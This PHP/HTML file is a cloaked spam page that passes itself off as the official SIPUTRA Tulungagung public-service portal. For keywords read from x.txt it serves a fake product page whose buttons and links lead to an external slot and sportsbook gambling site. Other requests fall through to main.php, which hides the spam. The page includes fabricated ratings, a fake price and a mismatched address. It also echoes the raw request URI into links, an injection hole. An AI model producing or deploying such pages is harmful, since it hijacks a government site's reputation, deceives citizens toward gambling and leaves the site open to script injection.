<?php
function feedback404()
{
    header("HTTP/1.0 403 Forbidden");
    echo "<h1>403 Forbidden</h1>";
    exit(); // Make sure to stop execution
}

if (isset($_GET['news_ID'])) { // Check for 'news_ID' instead of 'id'
    $filename = "x.txt";

    // Ensure the file exists before trying to read it
    if (file_exists($filename)) {
        $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $target_string = strtolower($_GET['news_ID']); // Get 'news_ID' parameter
        $BRAND = null;

        foreach ($lines as $item) {
            if (strtolower($item) === $target_string) {
                $BRAND = strtoupper($target_string);
                break; // Exit loop if match is found
            }
        }

        if (isset($BRAND)) {
            $BRANDS = $BRAND;

            // Force HTTPS protocol here
            $protocol = 'https'; // Ensure HTTPS is used, regardless of current protocol
            $fullUrl = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

            if ($fullUrl) {
                $parsedUrl = parse_url($fullUrl);
                $scheme = isset($parsedUrl['scheme']) ? $parsedUrl['scheme'] : '';
                $host = isset($parsedUrl['host']) ? $parsedUrl['host'] : '';
                $path = isset($parsedUrl['path']) ? $parsedUrl['path'] : '';
                $query = isset($parsedUrl['query']) ? $parsedUrl['query'] : '';
                $baseUrl = $scheme . "://" . $host . $path . '?' . $query;
                $urlPath = $baseUrl;

                // Add other logic if needed, for example processing $BRANDS
            } else {
                echo "Current URL is not defined.";
                exit();
            }
        } else {
            feedback404(); // Show 403 if not found in file
        }
    } else {
        feedback404(); // Show 403 if file x.txt doesn't exist
    }
} else {
    // If 'news_ID' parameter is not present, include main.php file
    include 'main.php';
    exit(); // Stop script execution after including main.php
}

date_default_timezone_set('Asia/Jakarta');
$currentTime = date('Y-m-d\TH:i:sP');
?>

<!DOCTYPE html><html lang="id"><head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="ENGQg4UDh8FbICQf8teFazoexXvSjeY8ktJ9tmh3yxA" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="canonical" href="<?php echo $urlPath; ?>">
    <link rel="amphtml" href="https://siputratulungagung.pages.dev/amp/?news_ID=<?php echo $BRANDS; ?>">
    <title><?php echo $BRANDS; ?> : SIPUTRA Tulungagung</title>
    <meta name="description" content="<?php echo $BRANDS; ?> dan SIPUTRA Tulungagung adalah portal layanan publik digital resmi Kabupaten Tulungagung. Temukan informasi terbaru, layanan administrasi online, e‑form, berita, dan pengaduan masyarakat secara cepat dan mudah.">
    <meta property="og:image" content="https://assetimage-pk69.pages.dev/3.jpg" />
    <meta property="og:image:width" content="1200" />
<meta property="og:image:height" content="630" />
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://assetimage-pk69.pages.dev/3.jpg">
    <!-- font-awesome cdn link -->
    <link rel="stylesheet" href="https://css-ec-ec.pages.dev/all.css">
    <link rel="icon" type="image/x-icon" href="https://temp-mail.org/images/favicon.ico">

    <!-- custom css file link -->
    <link rel="stylesheet" href="https://css-ec-ec.pages.dev/style.css">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
    <script type="application/ld+json">
        {
            "@context": "http://schema.org",
            "@type": "Product",
            "name": "<?php echo $BRANDS; ?> : SIPUTRA Tulungagung",
            "image": "https://assetimage-pk69.pages.dev/3.jpg",
            "description": "<?php echo $BRANDS; ?> dan SIPUTRA Tulungagung adalah portal layanan publik digital resmi Kabupaten Tulungagung. Temukan informasi terbaru, layanan administrasi online, e‑form, berita, dan pengaduan masyarakat secara cepat dan mudah.",
            "sku": "<?php echo $BRANDS; ?>-Daftar",
            "brand": {
                "@type": "Brand",
                "name": "<?php echo $BRANDS; ?>"
            },
            "offers": {
                "@type": "Offer",
                "url": "<?php echo $urlPath; ?>",
                "priceCurrency": "IDR",
                "price": "30000",
                "priceValidUntil": "2025-12-31",
                "itemCondition": "http://schema.org/NewCondition",
                "availability": "http://schema.org/InStock",
                "seller": {
                    "@type": "Organization",
                    "name": "<?php echo $BRANDS; ?>"
                }
            },
            "aggregateRating": {
                "@type": "AggregateRating",
                "ratingValue": "5",
                "reviewCount": "1000"
            }
        }
        </script>
</head>

<body>
    <section id="header">
        <img style="max-width: 50%; height: auto; display: block; margin-left: 0; padding: 10px;" src="https://res.cloudinary.com/dyxhlfip0/image/upload/v1725405642/logo-keren_nwpo4m.png" alt="BRAND logo">

        <div>
            <ul id="navbar">
                <li><a href="<?php echo $urlPath; ?>">Home</a></li>
                <li><a class="active" href="<?php echo $urlPath; ?>">Shop</a></li>
                <li><a href="<?php echo $urlPath; ?>">Blog</a></li>
                <li><a href="<?php echo $urlPath; ?>">About</a></li>
                <li><a href="<?php echo $urlPath; ?>">Contact</a></li>
                <li id="lg-bag"><a href="<?php echo $urlPath; ?>"><i class="far fa-shopping-bag"></i></a></li>
                <a href="<?php echo $urlPath; ?>" id="close"><i class="far fa-times"></i></a>
            </ul>
        </div>

        <div id="mobile">
            <a href="cart.html"><i class="far fa-shopping-bag"></i></a>
            <i id="bar" class="fas fa-outdent"></i>
        </div>
        
    </section>

    <section id="productdetails" class="section-p1">
        <div class="single-pro-image">
            <img src="https://assetimage-pk69.pages.dev/3.jpg" width="100%" id="MainImg" alt="<?php echo $BRANDS; ?>-img">
            <div class="small-image-group">
                <div class="small-img-col">
                    <img src="https://assetimage-pk69.pages.dev/3.jpg" width="100%" class="small-img" alt="<?php echo $BRANDS; ?>-Slot">
                </div>
                <div class="small-img-col">
                    <img src="https://assetimage-pk69.pages.dev/3.jpg" width="100%" class="small-img" alt="<?php echo $BRANDS; ?>-login">
                </div>
                <div class="small-img-col">
                    <img src="https://assetimage-pk69.pages.dev/3.jpg" width="100%" class="small-img" alt="<?php echo $BRANDS; ?>-sportsbook">
                </div>
                <div class="small-img-col">
                    <img src="https://assetimage-pk69.pages.dev/3.jpg" width="100%" class="small-img" alt="<?php echo $BRANDS; ?>-rtp-slot">
                </div>
            </div>
        </div>

        <div style="z-index: 100;" class="single-pro-details">
            <br>
            <h1 style="color: #f74124;"><?php echo $BRANDS; ?></h1>
            <h2><?php echo $BRANDS; ?> : SIPUTRA Tulungagung</h2>

            <a class="add-to-cart" href="https://siputratulungagung.pages.dev/amp/?news_ID=<?php echo $BRANDS; ?>" style="background-color: #800000; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px;">
    <span> <strong>DAFTAR <?php echo $BRANDS; ?></strong></span>
</a>
            <p> <strong>Rp 30.000</strong></p>
            <h3 style="color: #f74124;">Detail Produk  </h3>
            <p><a href="<?php echo $urlPath; ?>"><?php echo $BRANDS; ?></a> dan SIPUTRA Tulungagung adalah portal layanan publik digital resmi Kabupaten Tulungagung. Temukan informasi terbaru, layanan administrasi online, e‑form, berita, dan pengaduan masyarakat secara cepat dan mudah.</p>
    </div>
    </section>

    <section id="newsletter" class="section-p1 section-m1">
        <div class="newstext">
            <h3 style="color: azure;">Sign Up For Newsletter</h3>
            <p>Get E-mail updates about our latest shop and <span>special offers.</span></p>
        </div>
        <div class="form">
            <input style="border-radius: 10px;" type="text" placeholder="Your email address">
            <button class="normal" style="width: 30%; border-radius: 10px;">Sign Up</button>
        </div>
    </section>

    <footer class="section-p1">
        <!-- Your footer content goes here -->
        <div class="col">
            <img style="max-width: 50%; height: auto; padding: 10px;" class="logo" src="https://res.cloudinary.com/dyxhlfip0/image/upload/v1725405642/logo-keren_nwpo4m.png" alt="BRAND logo">
            <h3>Contact</h3>
            <p><strong>Address:</strong> Lahore, Pakistan - 54830</p>
            <p><strong>Phone:</strong> +92-321-4655990</p>
            <p><strong>Hours:</strong> 10:00 - 18:00, Mon - Sat</p>
            <div class="follow">
                <h3>Follow us</h3>
                <div class="icon">
                    <i class="fab fa-facebook-f"></i>
                    <i class="fab fa-twitter"></i>
                    <i class="fab fa-instagram"></i>
                    <i class="fab fa-pinterest-p"></i>
                    <i class="fab fa-youtube"></i>
                </div>
            </div>
        </div>
        <div class="col">
            <h3>About</h3>
            <a href="<?php echo $urlPath; ?>">About us</a>
            <a href="<?php echo $urlPath; ?>">Delivery Information</a>
            <a href="<?php echo $urlPath; ?>">Privacy Policy</a>
            <a href="<?php echo $urlPath; ?>">Terms & Conditions</a>
            <a href="<?php echo $urlPath; ?>">Contact Us</a>
        </div>
        <div class="col">
            <h3>My Account</h3>
            <a href="https://siputratulungagung.pages.dev/amp/?news_ID=<?php echo $BRANDS; ?>">Sign In</a>
            <a href="https://siputratulungagung.pages.dev/amp/?news_ID=<?php echo $BRANDS; ?>">View Cart</a>
            <a href="https://siputratulungagung.pages.dev/amp/?news_ID=<?php echo $BRANDS; ?>">My Wishlist</a>
            <a href="https://siputratulungagung.pages.dev/amp/?news_ID=<?php echo $BRANDS; ?>">Track My Order</a>
            <a href="https://siputratulungagung.pages.dev/amp/?news_ID=<?php echo $BRANDS; ?>">Help</a>
        </div>
        <div class="col install">
            <h3>Install App</h3>
            <p>From App Store or Google Play</p>
            <div class="row">
                <a href="https://siputratulungagung.pages.dev/amp/?news_ID=<?php echo $BRANDS; ?>">
                    <img class="app-icon" src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/67/App_Store_%28iOS%29.svg/2048px-App_Store_%28iOS%29.svg.png" alt="BRAND-iOs">
                </a>
                <a href="https://siputratulungagung.pages.dev/amp/?news_ID=<?php echo $BRANDS; ?>">
                    <img class="app-icon" src="https://cdn-icons-png.flaticon.com/512/300/300218.png" alt="BRAND-Android">
                </a>
            </div>
        </div>
    
        <p>Secured Payment Gateway</p>
        <img src="images/pay.png" alt="">
    
        <!-- Start of the copyright section -->
        <div class="copyright">
            <p>Created By <?php echo $BRANDS; ?> | All Rights Reserved | PK69@2025</p>
        </div>
        <!-- End of the copyright section -->
    
        <style>
            /* CSS untuk gambar aplikasi */
            .app-icon {
                width: 50px;  /* Ukuran lebar gambar */
                height: 50px; /* Ukuran tinggi gambar, agar tetap berbentuk kotak */
                object-fit: contain;  /* Menjaga proporsi gambar agar tidak terdistorsi */
                margin: 0 10px;  /* Jarak antar gambar */
            }
    
            /* CSS untuk layout row dan col */
            .row {
                display: flex;
                justify-content: center;
                align-items: center;
            }
    
            .col {
                text-align: center;
            }
    
            /* Styling untuk teks heading dan deskripsi */
            h3 {
                font-size: 24px;
                margin-bottom: 10px;
            }
    
            p {
                font-size: 16px;
                margin-bottom: 20px;
            }
        </style>
    </footer>
    <!-- javascript script file code -->
    <script>
        var mainImg = document.getElementById("MainImg");
        var smallImg = document.getElementsByClassName("small-img");
        smallImg[0].onclick = function() {
            mainImg.src = smallImg[0].src;
        }
        smallImg[1].onclick = function () {
            mainImg.src = smallImg[1].src;
        }
        smallImg[2].onclick = function () {
            mainImg.src = smallImg[2].src;
        }
        smallImg[3].onclick = function () {
            mainImg.src = smallImg[3].src;
        }
    </script>

    <!-- javascript script file link -->
    <script>const bar = document.getElementById('bar');
        const close = document.getElementById('close');
        const nav = document.getElementById('navbar');
        
        if (bar) {
            bar.addEventListener('click', () => {
                nav.classList.add('active');
            })
        }
        
        if (close) {
            close.addEventListener('click', () => {
                nav.classList.remove('active');
            })
        }</script>
    



</body></html>
